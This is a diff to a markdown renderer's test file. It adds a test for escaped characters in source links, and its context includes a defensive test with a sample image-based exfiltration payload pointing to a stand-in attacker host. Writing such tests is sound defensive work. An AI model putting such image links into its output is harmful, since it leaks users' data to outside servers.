@@ -35,6 +35,21 @@ describe('renderMarkdown', () => {
   });
 });
 
+describe('web sources', () => {
+  it('renders the marks and the list as links, a title’s dollars as dollars, not maths', () => {
+    const box = document.createElement('div');
+    box.append(
+      renderMarkdownFragment(
+        'Costs $5 [&#91;1&#93;](<https://example.com/a_(b)>).\n\n**Sources**\n\n1. [The &#91;Tower&#93; &#36;5 &#92;&#40;and&#41; &#36;6](<https://example.com/a_(b)>)\n',
+      ),
+    );
+    const links = [...box.querySelectorAll('a')];
+    expect(links.map((a) => a.textContent)).toEqual(['[1]', 'The [Tower] $5 \\(and) $6']);
+    expect(links.every((a) => a.getAttribute('href') === 'https://example.com/a_(b)')).toBe(true);
+    expect(box.querySelector('.katex')).toBeNull();
+  });
+});
+
 describe('model output hardening', () => {
   it('never renders remote images, which could carry data out', () => {
     const html = renderMarkdown('See ![chart](https://evil.example/leak?q=secret) and <img src="https://evil.example/x">');
